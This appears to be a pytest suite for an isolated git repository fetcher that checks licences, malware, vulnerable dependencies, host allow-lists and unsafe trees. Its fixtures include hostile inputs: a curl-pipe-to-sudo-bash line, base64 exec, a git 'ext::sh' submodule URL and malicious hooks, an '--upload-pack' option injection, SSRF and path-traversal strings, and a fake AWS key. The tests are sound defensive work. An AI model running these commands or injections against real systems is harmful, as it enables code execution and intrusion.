"""WG-7 (#755): the isolated repository fetcher. Real git against local repositories, fakes for the
network, ClamAV and the package services: nothing here reaches the internet."""

import io
import json
import subprocess
import uuid
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest
from fixtures import eicar_bytes
from sbam_api.scan.clamd import ScanVerdict
from sbam_api.storage.base import Kind, StorageScope
from sbam_api.storage.local import LocalDiskBackend
from sbam_contracts.repo_scan import (
    FetchDecision,
    LicenceOverride,
    LicenceVerdict,
    RefusalReason,
    RepoScanReport,
    Severity,
)
from sbam_workers.build.gates.toolchain import ToolOutput
from sbam_workers.repo_fetch.hosts import HostPolicy, HostRefused, host_of
from sbam_workers.repo_fetch.http import PolicyHttp
from sbam_workers.repo_fetch.licence import licence_of_repo, verdict_of
from sbam_workers.repo_fetch.report import bundle_tar
from sbam_workers.repo_fetch.scan import Request, Tools, fetch_and_scan
from sbam_workers.repo_fetch.static import bandit_scan, pattern_scan
from sbam_workers.repo_fetch.tree import safe_path

URL = "https://github.com/acme/pcb-tools"
MIT = (
    "MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy "
    "of this software"
)
GPL = "GNU GENERAL PUBLIC LICENSE\nVersion 3, 29 June 2007\n"
# The EICAR test string is joined at call time from the two stored halves (never in the tree).
EICAR = eicar_bytes().decode("ascii")
# A made-up AWS key id, joined at run time so the literal is never in the tree (secret scan).
FAKE_AWS_KEY = "AKIA" + "ABCDEFGHIJKLMNOP"
PUBLIC = ["140.82.112.3"]


def git(cwd: Path, *args: str) -> str:
    done = subprocess.run(  # noqa: S603 - a test helper with fixed git arguments
        ["git", "-c", "user.name=t", "-c", "user.email=t@example.com", *args],  # noqa: S607
        cwd=cwd,
        capture_output=True,
        text=True,
        check=True,
    )
    return done.stdout.strip()


def make_repo(root: Path, files: dict[str, str], *, name: str = "pcb-tools") -> Path:
    repo = root / name
    repo.mkdir(parents=True)
    git(repo, "init", "-q", "-b", "main")
    for path, text in files.items():
        target = repo / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text, encoding="utf-8")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "init")
    return repo


def commit_more(repo: Path, path: str, text: str) -> str:
    (repo / path).write_text(text, encoding="utf-8")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "more")
    return git(repo, "rev-parse", "HEAD")


class FakeClam:
    def __init__(self) -> None:
        self.seen: list[int] = []

    def scan(self, stream: Any) -> ScanVerdict:
        data = stream.read()
        self.seen.append(len(data))
        if EICAR.encode() in data:
            return ScanVerdict(infected=True, signature="Eicar-Test-Signature")
        return ScanVerdict(infected=False)


class FakeExecutor:
    """Stands in for Bandit's process; the one Bandit test below uses the real one."""

    def run(self, tool: str, files: Any, config: str | None) -> ToolOutput:
        return ToolOutput('{"results": []}', "1.9.4")


class FakeHttp:
    def __init__(self, gets: dict[str, dict[str, Any]] | None = None, osv: Any = None) -> None:
        self.gets, self.osv = gets or {}, osv
        self.urls: list[str] = []

    def get(self, url: str) -> dict[str, Any] | None:
        self.urls.append(url)
        return self.gets.get(url)

    def post(self, url: str, body: dict[str, Any]) -> dict[str, Any] | None:
        self.urls.append(url)
        return self.osv(body) if self.osv else {"results": [{} for _ in body["queries"]]}


def policy(*urls: str) -> HostPolicy:
    return HostPolicy.for_urls(urls or (URL,), resolver=lambda host: PUBLIC)


def run(
    tmp_path: Path,
    repo: Path | None,
    *,
    url: str = URL,
    ref: str | None = "main",
    http: Any = None,
    override: LicenceOverride | None = None,
    approved: tuple[str, ...] = (),
    executor: Any = None,
) -> tuple[RepoScanReport, str, LocalDiskBackend, StorageScope, FakeClam]:
    storage = LocalDiskBackend(tmp_path / "store")
    scope = StorageScope(uuid.uuid4(), uuid.uuid4())
    clam = FakeClam()
    config = []
    if repo is not None:
        config = [
            ("protocol.file.allow", "always"),
            (f"url.file://{repo}.insteadOf", url),
        ]
    tools = Tools(
        storage=storage,
        scope=scope,
        clam=clam,
        http=http,
        executor=executor or FakeExecutor(),
        git_config=config,
        now=datetime(2026, 11, 17, tzinfo=UTC),
    )
    outcome = fetch_and_scan(Request(url, ref, policy(*(approved or (url,))), override), tools)
    return outcome.report, outcome.report_sha256, storage, scope, clam


def test_wg7_t01_clone_is_pinned_to_a_hash(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "tool.py": "print('a')\n"})
    first = git(repo, "rev-parse", "HEAD")
    report, *_ = run(tmp_path, repo, ref="main")
    assert (report.decision, report.commit, report.ref) == (FetchDecision.VENDORED, first, "main")
    # The branch moves on; a run pinned to the recorded hash still gets the same tree and bundle.
    commit_more(repo, "tool.py", "print('b')\n")
    again, *_ = run(tmp_path / "again", repo, ref=first)
    assert again.commit == first and again.bundle_sha256 == report.bundle_sha256
    moved, *_ = run(tmp_path / "moved", repo, ref="main")
    assert moved.commit != first and moved.bundle_sha256 != report.bundle_sha256


def test_wg7_t01_a_tag_is_resolved_to_its_commit_and_no_ref_means_the_default_branch(
    tmp_path: Path,
) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "a.txt": "x"})
    tagged = git(repo, "rev-parse", "HEAD")
    git(repo, "tag", "-a", "v1.0", "-m", "release")
    commit_more(repo, "a.txt", "y")
    by_tag, *_ = run(tmp_path / "t", repo, ref="v1.0")
    default, *_ = run(tmp_path / "d", repo, ref=None)
    assert by_tag.commit == tagged and default.commit != tagged


def test_wg7_the_vendored_tree_is_stored_content_addressed_and_reproducible(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "pkg/a.py": "x = 1\n", "README.md": "hi\n"})
    report, sha, storage, scope, _ = run(tmp_path, repo)
    assert report.bundle_sha256 and report.bundle_files == 3
    assert storage.exists(scope.key(Kind.REPOS, report.bundle_sha256))
    stored = json.loads(storage.get(scope.key(Kind.REPOS, sha), verify=True))
    assert RepoScanReport.model_validate(stored) == report
    files = {"b": b"2", "a": b"1"}
    assert bundle_tar(files) == bundle_tar(dict(reversed(files.items())))


def test_wg7_t02_a_gpl_repo_is_refused_and_not_vendored(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": GPL, "tool.py": "x = 1\n"})
    report, sha, storage, scope, _ = run(tmp_path, repo)
    assert report.decision == FetchDecision.REFUSED
    assert report.refusals == [RefusalReason.LICENCE]
    assert report.licence is not None
    assert (report.licence.spdx, report.licence.verdict) == ("GPL-3.0-only", LicenceVerdict.REFUSED)
    assert report.bundle_sha256 is None and report.bundle_files == 0
    assert storage.exists(scope.key(Kind.REPOS, sha))  # the evidence is stored either way


def test_wg7_t02_an_override_with_a_recorded_reason_lets_it_through(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": GPL, "tool.py": "x = 1\n"})
    who = LicenceOverride(reason="Legal approved use as a separate process", by="fde-1")
    report, *_ = run(tmp_path, repo, override=who)
    assert report.decision == FetchDecision.VENDORED and report.bundle_sha256
    assert report.licence is not None and report.licence.override == who
    assert any("Legal approved" in n for n in report.notes)


@pytest.mark.parametrize("text", ["Some custom terms: do not copy.", ""])
def test_wg7_t02_an_unknown_or_missing_licence_is_refused(tmp_path: Path, text: str) -> None:
    files = {"LICENSE": text, "a.py": "x=1\n"} if text else {"a.py": "x=1\n"}
    report, *_ = run(tmp_path, make_repo(tmp_path, files))
    assert report.refusals == [RefusalReason.LICENCE]
    assert report.licence is not None and report.licence.verdict == LicenceVerdict.UNKNOWN


def test_wg7_licence_rules() -> None:
    assert verdict_of("MIT") == LicenceVerdict.ALLOWED
    assert verdict_of("MIT OR GPL-3.0-only") == LicenceVerdict.ALLOWED  # a choice
    assert verdict_of("MIT AND GPL-3.0-only") == LicenceVerdict.REFUSED  # both apply
    assert verdict_of("AGPL-3.0-only") == LicenceVerdict.REFUSED
    assert verdict_of("LicenseRef-custom") == LicenceVerdict.UNKNOWN
    pkg = json.dumps({"license": "ISC"}).encode()
    assert licence_of_repo({"package.json": pkg}).verdict == LicenceVerdict.ALLOWED
    clash = licence_of_repo({"LICENSE": GPL.encode(), "package.json": pkg})
    assert clash.verdict == LicenceVerdict.REFUSED  # the worst finding wins


def test_wg7_t03_eicar_in_a_repo_is_quarantined(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "ok.py": "x = 1\n", "payload/eicar.com": EICAR})
    report, _, _, _, clam = run(tmp_path, repo)
    assert [(f.path, f.signature) for f in report.clam_findings] == [
        ("payload/eicar.com", "Eicar-Test-Signature")
    ]
    assert report.decision == FetchDecision.REFUSED and RefusalReason.MALWARE in report.refusals
    assert report.bundle_sha256 is None  # the infected file is never vendored
    assert len(clam.seen) == 3  # every file was scanned


DEP_VULN = {"results": [{"vulns": [{"id": "GHSA-xxxx-yyyy"}]}]}


def osv(body: dict[str, Any]) -> dict[str, Any]:
    assert body["queries"][0] == {
        "package": {"name": "requests", "ecosystem": "PyPI"},
        "version": "2.19.0",
    }
    return DEP_VULN


def test_wg7_t04_a_dependency_with_a_known_vulnerability_is_flagged(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "requirements.txt": "requests==2.19.0\n"})
    http = FakeHttp(
        {
            "https://pypi.org/pypi/requests/2.19.0/json": {"info": {"license": "Apache 2.0"}},
            "https://api.osv.dev/v1/vulns/GHSA-xxxx-yyyy": {
                "summary": "Session fixation",
                "database_specific": {"severity": "HIGH"},
            },
        },
        osv=osv,
    )
    report, *_ = run(tmp_path, repo, http=http)
    [vuln] = report.vulnerabilities
    assert (vuln.package, vuln.version, vuln.id) == ("requests", "2.19.0", "GHSA-xxxx-yyyy")
    assert (vuln.severity, vuln.summary) == (Severity.HIGH, "Session fixation")
    [dep] = report.dependency_licences
    assert (dep.spdx, dep.verdict) == ("Apache-2.0", LicenceVerdict.ALLOWED)
    assert report.decision == FetchDecision.VENDORED  # flagged for the FDE, not refused


def test_wg7_a_copyleft_dependency_refuses_the_repo(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "requirements.txt": "gplthing==1.0\n"})
    http = FakeHttp(
        {"https://pypi.org/pypi/gplthing/1.0/json": {"info": {"license": "GPL-3.0-only"}}}
    )
    report, *_ = run(tmp_path, repo, http=http)
    assert report.refusals == [RefusalReason.LICENCE]
    assert report.dependency_licences[0].verdict == LicenceVerdict.REFUSED


def test_wg7_t05_the_fetcher_cannot_reach_an_unlisted_host(tmp_path: Path) -> None:
    other = "https://evil.example.org/acme/pcb-tools"
    report, *_ = run(tmp_path, None, url=other, approved=(URL,))
    assert report.decision == FetchDecision.REFUSED
    assert report.refusals == [RefusalReason.HOST_NOT_APPROVED]
    assert report.commit is None and report.host == "evil.example.org"
    # the package and vulnerability calls go through the same policy
    http = PolicyHttp(policy())
    with pytest.raises(HostRefused):
        http.get("https://evil.example.org/x.json")
    with pytest.raises(HostRefused):
        http.post("https://example.com/v1/querybatch", {})


@pytest.mark.parametrize(
    "url",
    [
        "http://github.com/acme/x",
        "ssh://github.com/acme/x",
        "https://user:pw@github.com/acme/x",
        "https://github.com/acme/x?token=abc",
        "https://127.0.0.1/acme/x",
        "https://2130706433/acme/x",
        "https://0x7f000001/acme/x",
        "https://[::1]/acme/x",
        "https://localhost/acme/x",
        "https://gitserver/acme/x",
        "https://git.corp.local/acme/x",
    ],
)
def test_wg7_t05_unsafe_urls_are_refused_before_any_connection(url: str) -> None:
    with pytest.raises(HostRefused):
        host_of(url)


def test_wg7_t05_a_name_that_resolves_to_a_private_address_is_refused() -> None:
    sneaky = HostPolicy.for_urls([URL], resolver=lambda host: ["10.0.0.7"])
    with pytest.raises(HostRefused):
        sneaky.check_repo(URL)
    mixed = HostPolicy.for_urls([URL], resolver=lambda host: ["140.82.112.3", "169.254.169.254"])
    with pytest.raises(HostRefused):
        mixed.check_repo(URL)
    with pytest.raises(HostRefused):
        HostPolicy.for_urls([URL], resolver=lambda host: []).check_repo(URL)


def test_wg7_a_fixed_service_is_not_an_approved_repository_source() -> None:
    p = policy()
    assert p.check("https://pypi.org/pypi/x/1/json") == "pypi.org"
    with pytest.raises(HostRefused):
        p.check_repo("https://pypi.org/acme/x")


def test_wg7_t06_an_archived_repo_is_flagged(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "a.py": "x = 1\n"})
    http = FakeHttp(
        {
            "https://api.github.com/repos/acme/pcb-tools": {
                "archived": True,
                "pushed_at": "2023-01-02T03:04:05Z",
            },
            "https://api.github.com/repos/acme/pcb-tools/releases/latest": {
                "published_at": "2022-12-01T00:00:00Z"
            },
        }
    )
    report, *_ = run(tmp_path, repo, http=http)
    assert report.health.archived is True
    assert report.health.flags == ["ARCHIVED"]  # a flag, not a refusal
    assert report.health.last_release_at == "2022-12-01T00:00:00+00:00"
    assert report.decision == FetchDecision.VENDORED


def test_wg7_no_commit_for_two_years_is_flagged_stale() -> None:
    from sbam_workers.repo_fetch.health import health_of

    now = datetime(2026, 11, 17, tzinfo=UTC)
    assert health_of(URL, "2024-01-01T00:00:00+00:00", None, now).flags == ["STALE"]
    assert health_of(URL, "2026-06-01T00:00:00+00:00", None, now).flags == []


def test_wg7_health_comes_from_the_commit_when_the_host_says_nothing(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "a.py": "x = 1\n"})
    report, *_ = run(tmp_path, repo, http=None)
    assert report.health.archived is None and report.health.last_commit_at is not None
    assert report.health.flags == []


def test_wg7_a_symlink_makes_the_tree_unsafe(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "a.py": "x = 1\n"})
    (repo / "link").symlink_to("/etc/passwd")
    git(repo, "add", "-A")
    git(repo, "commit", "-q", "-m", "link")
    report, *_ = run(tmp_path, repo)
    assert report.decision == FetchDecision.REFUSED
    assert report.refusals == [RefusalReason.UNSAFE_TREE] and report.unsafe_paths == ["link"]
    assert report.bundle_sha256 is None and report.licence is None  # nothing was read further


def test_wg7_a_submodule_entry_makes_the_tree_unsafe(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT, "a.py": "x = 1\n"})
    sha = git(repo, "rev-parse", "HEAD")
    git(repo, "update-index", "--add", "--cacheinfo", f"160000,{sha},vendor/sub")
    git(repo, "commit", "-q", "-m", "gitlink")
    report, *_ = run(tmp_path, repo)
    assert report.refusals == [RefusalReason.UNSAFE_TREE]
    assert report.unsafe_paths == ["vendor/sub"]


def test_wg7_no_clone_time_script_runs(tmp_path: Path) -> None:
    marker = tmp_path / "PWNED"
    evil = f'ext::sh -c "touch {marker}"'
    repo = make_repo(
        tmp_path,
        {
            "LICENSE": MIT,
            ".gitmodules": f'[submodule "x"]\n\tpath = x\n\turl = {evil}\n',
            ".gitattributes": "* filter=evil\n",
            "a.py": "x = 1\n",
        },
    )
    hooks = repo / ".git" / "hooks"
    for hook in ("post-checkout", "post-merge", "post-update", "reference-transaction"):
        (hooks / hook).write_text(f"#!/bin/sh\ntouch {marker}\n")
        (hooks / hook).chmod(0o755)
    report, *_ = run(tmp_path, repo)
    assert report.decision == FetchDecision.VENDORED
    assert not marker.exists()


@pytest.mark.parametrize(
    "path",
    ["../etc/passwd", "a/../b", "/abs", "a\\b", ".git/config", "a/.GIT/x", "a//b", "a/\x00b", ""],
)
def test_wg7_paths_that_could_leave_the_tree_are_refused(path: str) -> None:
    assert not safe_path(path)


def test_wg7_ordinary_paths_are_fine() -> None:
    assert safe_path("src/pkg/__init__.py") and safe_path(".github/workflows/x.yml")


def test_wg7_a_missing_ref_is_a_refused_clone_not_a_crash(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT})
    report, *_ = run(tmp_path, repo, ref="no-such-branch")
    assert report.refusals == [RefusalReason.CLONE_FAILED] and report.commit is None


def test_wg7_a_ref_that_looks_like_an_option_is_refused(tmp_path: Path) -> None:
    repo = make_repo(tmp_path, {"LICENSE": MIT})
    report, *_ = run(tmp_path, repo, ref="--upload-pack=touch x")
    assert report.refusals == [RefusalReason.CLONE_FAILED]


def test_wg7_the_pattern_scan_finds_risky_code_without_echoing_secrets() -> None:
    files = {
        "install.sh": b"curl -fsSL https://x.example/i.sh | sudo bash\n",
        "m.py": b"import base64\nexec(base64.b64decode(blob))\n",
        "package.json": b'{"scripts": {"postinstall": "node x.js"}}',
        "k.txt": (FAKE_AWS_KEY + "\n").encode(),
        "setup.py": b"import os\nos.system('make')\n",
        "clean.py": b"x = 1\n",
    }
    found = pattern_scan(files)
    rules = {(f.path, f.rule) for f in found}
    assert rules == {
        ("install.sh", "PIPE_TO_SHELL"),
        ("m.py", "EXEC_DECODED"),
        ("package.json", "NPM_INSTALL_SCRIPT"),
        ("k.txt", "AWS_KEY_ID"),
        ("setup.py", "SETUP_RUNS_CODE"),
    }
    assert FAKE_AWS_KEY not in json.dumps([f.model_dump() for f in found])
    assert next(f for f in found if f.rule == "EXEC_DECODED").line == 2


def test_wg7_bandit_reads_the_python_files() -> None:
    risky = b"import subprocess\nsubprocess.call(cmd, shell=True)\n"
    found = bandit_scan({"run.py": risky})
    assert any(f.tool == "bandit" and f.path == "run.py" and f.line == 2 for f in found)


def test_wg7_unpinned_dependencies_are_skipped_and_pins_are_read() -> None:
    from sbam_workers.repo_fetch.deps import read_dependencies

    lock = {"packages": {"": {}, "node_modules/left-pad": {"version": "1.3.0", "license": "MIT"}}}
    deps = read_dependencies(
        {
            "requirements.txt": b"Flask==2.0.1  # web\nrequests>=2\n-r other.txt\n",
            "pyproject.toml": b'[project]\ndependencies = ["Jinja2==3.1.2", "attrs"]\n',
            "web/package-lock.json": json.dumps(lock).encode(),
        }
    )
    assert [(d.ecosystem, d.name, d.version, d.spdx) for d in deps] == [
        ("PyPI", "flask", "2.0.1", None),
        ("PyPI", "jinja2", "3.1.2", None),
        ("npm", "left-pad", "1.3.0", "MIT"),
    ]


def test_wg7_the_fake_clam_reads_a_stream() -> None:
    assert FakeClam().scan(io.BytesIO(b"clean")).infected is False
